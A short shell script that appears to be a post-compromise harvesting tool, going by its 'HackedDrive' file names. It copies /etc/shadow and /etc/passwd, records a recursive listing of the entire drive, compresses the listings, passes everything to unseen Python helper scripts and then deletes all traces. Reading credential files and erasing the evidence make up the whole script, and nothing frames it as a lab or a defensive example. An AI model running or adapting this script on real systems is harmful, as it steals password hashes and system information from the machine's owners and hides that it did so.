chmod 755 *
sudo apt-get install tree
cp /etc/shadow shadow.txt
cp /etc/passwd passwd.txt
tree ../ -R -f -l -a > HackedDriveFileList.txt
tree ../ -R -f -l -a -d > HackedDriveFolderList.txt
tar -cvjSf HackedDriveFileList.txt.tar.xz HackedDriveFileList.txt
tar -cvjSf HackedDriveFolderList.txt.tar.xz HackedDriveFolderList.txt
chmod 755 *
python shadowgen.py
python passwdgen.py
python listgen.py
python foldergen.py
rm -r shadow.txt
rm -r passwd.txt
rm -r HackedDriveFileList.txt
rm -r HackedDriveFolderList.txt
rm -r HackedDriveFileList.txt.tar.xz
rm -r HackedDriveFolderList.txt.tar.xz
